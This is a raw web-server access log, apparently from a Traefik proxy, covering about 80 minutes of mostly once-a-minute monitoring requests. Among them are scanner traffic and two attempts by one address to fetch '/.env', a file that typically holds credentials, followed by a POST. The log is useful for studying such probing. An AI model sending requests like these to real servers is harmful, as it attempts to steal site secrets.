159.203.109.206 - - [14/Dec/2023:07:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1223 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1224 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1225 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1226 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1227 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1228 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1229 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1230 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1231 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1232 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1233 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1234 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1235 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1236 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1237 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1238 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1239 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1240 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1241 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1242 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1243 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1244 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1245 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1246 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1247 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1248 "www@docker" "http://172.25.0.8:80" 1ms
45.142.182.77 - - [14/Dec/2023:07:47:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1249 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1250 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1251 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1252 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1253 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1254 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1255 "www@docker" "http://172.25.0.8:80" 1ms
71.6.134.230 - - [14/Dec/2023:07:50:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1256 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1257 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1258 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1259 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1260 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1261 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1262 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1263 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1264 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1265 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1266 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1267 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1268 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1269 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1270 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1271 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1272 "www@docker" "http://172.25.0.8:80" 1ms
68.69.186.30 - - [14/Dec/2023:07:59:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1273 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1274 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1275 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.22 - - [14/Dec/2023:08:00:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1276 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1277 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:00:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1278 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1279 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1280 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1281 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1282 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1283 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1284 "www@docker" "http://172.25.0.8:80" 0ms
141.98.11.60 - - [14/Dec/2023:08:04:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1285 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1286 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:08:04:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1287 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:08:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1288 "www@docker" "http://172.25.0.8:80" 0ms
95.111.225.53 - - [14/Dec/2023:08:04:42 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 1289 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1290 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1291 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1292 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1293 "www@docker" "http://172.25.0.8:80" 0ms
71.6.134.230 - - [14/Dec/2023:08:06:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1294 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1295 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1296 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1297 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1298 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1299 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1300 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1301 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1302 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1303 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1304 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1305 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1306 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1307 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1308 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1309 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1310 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1311 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1312 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1313 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1314 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1315 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1316 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1317 "www@docker" "http://172.25.0.8:80" 0ms
43.134.79.204 - - [14/Dec/2023:08:18:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1318 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:08:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1319 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:08:19:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1320 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1321 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1322 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1323 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1324 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1325 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1326 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1327 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1328 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1329 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1330 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1331 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1332 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1333 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1334 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1335 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1336 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1337 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1338 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1339 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1340 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:08:28:59 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1341 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:08:28:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1342 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1343 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1344 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1345 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1346 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1347 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1348 "www@docker" "http://172.25.0.8:80" 0ms
198.235.24.112 - - [14/Dec/2023:08:32:06 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1349 "-" "-" 0ms
194.187.176.90 - - [14/Dec/2023:08:32:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1350 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1351 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1352 "www@docker" "http://172.25.0.8:80" 0ms
185.134.22.149 - - [14/Dec/2023:08:33:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1353 "-" "-" 0ms
185.134.22.149 - - [14/Dec/2023:08:33:23 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 1354 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1355 "www@docker" "http://172.25.0.8:80" 0ms
185.134.22.149 - - [14/Dec/2023:08:33:25 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 1356 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:08:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1357 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1358 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1359 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1360 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1361 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1362 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1363 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1364 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1365 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1366 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1367 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:08:39:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1368 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:08:39:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1369 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1370 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1371 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1372 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1373 "www@docker" "http://172.25.0.8:80" 0ms
167.94.146.59 - - [14/Dec/2023:08:41:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1374 "-" "-" 0ms
167.94.146.59 - - [14/Dec/2023:08:41:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1375 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1376 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1377 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1378 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1379 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1380 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1381 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1382 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1383 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1384 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1385 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1386 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1387 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1388 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:08:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1389 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1390 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1391 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1392 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1393 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1394 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1395 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1396 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1397 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1398 "www@docker" "http://172.25.0.8:80" 1ms
167.248.133.35 - - [14/Dec/2023:08:52:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1399 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:08:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1400 "www@docker" "http://172.25.0.8:80" 0ms
167.248.133.35 - - [14/Dec/2023:08:52:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1401 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:08:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1402 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1403 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:08:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1404 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1405 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:08:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1406 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:08:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1407 "www@docker" "http://172.25.0.8:80" 0ms
